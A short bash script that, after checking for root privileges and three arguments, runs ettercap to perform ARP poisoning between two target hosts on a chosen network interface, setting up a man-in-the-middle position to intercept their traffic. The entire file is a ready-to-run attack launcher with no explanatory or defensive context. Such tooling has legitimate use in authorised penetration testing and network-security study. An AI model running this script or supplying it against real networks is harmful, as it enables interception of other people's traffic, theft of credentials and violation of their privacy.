#!/bin/bash

if [ "$EUID" -ne 0 ]
  then echo "Please run as root"
  exit
fi

if [ $# -ne 3 ]
  then echo "Usage: $0 <interface> <target1> <target2>"
  exit
fi

IFACE=$1
TARGET1=$2
TARGET2=$3

ettercap -T -M arp:remote /$TARGET1// /$TARGET2// -i $IFACE
